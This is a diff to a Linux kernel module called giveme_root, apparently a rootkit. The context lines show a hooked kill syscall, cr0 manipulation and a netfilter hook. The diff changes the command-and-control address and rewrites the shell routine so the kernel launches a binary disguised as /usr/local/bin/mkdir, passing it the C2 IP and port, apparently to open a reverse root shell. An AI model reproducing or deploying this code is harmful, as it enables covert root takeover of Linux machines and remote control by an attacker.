@@ -18,7 +18,8 @@
 #define SPORT 1337
 #define DPORT 1339
 
-#define C2IP    "10.0.2.2"
+#define PACKAGE "/usr/local/bin/mkdir"
+#define C2IP    "192.168.0.60"
 #define C2PORT  "9090"
 
 unsigned long cr0;
@@ -29,14 +30,29 @@ typedef asmlinkage int (*orig_kill_t)(pid_t, int);
 orig_kill_t orig_kill;
 static struct nf_hook_ops nfho;
 
-static void shell(void){
-	printk(KERN_INFO "SHELL\n");
-	char *argv[] = { "/tmp/tcp_client", C2IP, C2PORT, NULL };
-	static char *envp[] = {
-		"HOME=/",
-		"TERM=linux",
-		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-	call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC );
+// http://www.drkns.net/kernel-who-does-magic/
+static void shell_free_argv(struct subprocess_info * info){
+  kfree(info->argv);
+}
+
+static int shell(void){
+  struct subprocess_info * info;
+  static char * envp[] = {
+    "HOME=/",
+    "TERM=linux", 
+    "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 
+    NULL
+  };
+
+  char ** argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
+
+  argv[0] = PACKAGE;
+  argv[1] = C2IP;
+  argv[2] = C2PORT;
+  argv[3] = NULL;
+
+  info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,NULL, shell_free_argv, NULL);
+  return call_usermodehelper_exec(info, UMH_WAIT_EXEC); 
 }
 
 //Code from https://stackoverflow.com/a/16532923
@@ -176,3 +192,4 @@ void __exit giveme_root_exit(void){
 
 module_init(giveme_root_init);
 module_exit(giveme_root_exit);
+
